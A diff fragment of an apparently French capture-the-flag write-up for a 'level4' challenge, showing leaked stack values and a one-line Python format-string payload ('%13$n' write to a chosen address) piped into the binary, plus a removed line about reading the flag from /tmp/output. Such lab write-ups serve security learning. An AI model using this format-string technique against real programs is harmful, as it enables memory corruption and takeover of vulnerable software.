@@ -24,5 +24,3 @@ AAAAb7ff26b0 bffff734 b7fd0ff4 0 0 bffff6f8 804848d bffff4f0 200 b7fd1ac0 b7ff37
 <pre>
 $> python -c "print ('AAAA' + '\x10\x98\x04\x08' + '%16930108d'+ '%13\$n')" | ./level4 | tr -d ' '
 </pre>
-
-- Il suffit alors d'ouvrir le `/tmp/output` avec vim pour voir le flag. (attention au cat ^^).
